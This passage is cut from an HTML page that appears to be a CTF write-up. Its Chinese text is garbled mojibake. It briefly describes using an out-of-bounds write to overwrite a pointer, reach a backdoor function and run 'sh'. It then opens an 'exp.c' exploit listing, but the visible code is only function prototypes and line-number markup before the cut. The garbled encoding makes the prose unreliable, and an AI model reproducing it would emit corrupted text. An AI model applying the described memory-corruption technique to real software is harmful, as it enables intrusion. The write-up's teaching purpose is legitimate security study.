ä¸ªå­—èŠ‚å¯ä»¥ä¿è¯è¿›å…¥åé—¨å‡½æ•°ï¼Œåˆ©ç”¨è¶Šç•Œå†™æ§åˆ¶ä¸‹æ ‡è¦†å†™ score æŒ‡é’ˆã€‚</li><li>å…¶æ¬¡éœ€è¦æ§åˆ¶ cmd çš„å†…å®¹ï¼Œç†æƒ³çŠ¶æ€åº”è¯¥é€‰å– <code>/bin/sh\0</code> ï¼Œä½†æˆ‘æ²¡èƒ½åœ¨å›ºå®šåœ°å€æ‰¾åˆ°ï¼Œå°±é€‰å–äº† <code>sh\0</code>ï¼Œæœ€ç»ˆä¹ŸæˆåŠŸå®Œæˆäº†åˆ©ç”¨ã€‚</li></ol><h4 id="exp-c"><a class="header-anchor" href="#exp-c">Â¶</a>exp.c</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">fight</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> num)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n0</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n1</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n2</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n3</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n4</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n5</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n6</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n7</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n8</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n9</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n10</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n11</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n12</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n13</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n14</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n15</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n16</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n17</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n18</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n19</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n20</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n21</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n22</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n23</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n24</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n25</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n26</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n27</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n28</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n29</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n30</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n31</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n32</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n33</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n34</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n35</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n36</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n37</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n38</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n39</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n40</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n41</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n42</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n43</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n44</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n45</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n46</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n47</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n48</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n49</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n50</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n51</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n52</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n53</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n54</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n55</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n56</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n57</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n58</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n59</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n60</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n61</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n62</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n63</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n64</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n65</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n66</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n67</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n68</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n69</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n70</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n71</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n72</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n73</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n74</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n75</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n76</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n77</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n78</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n79</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n80</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n81</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n82</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n83</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n84</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n85</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n86</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n87</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n88</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n89</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n90</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n91</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n92</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n93</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n94</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n95</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n96</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n97</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n98</span><span 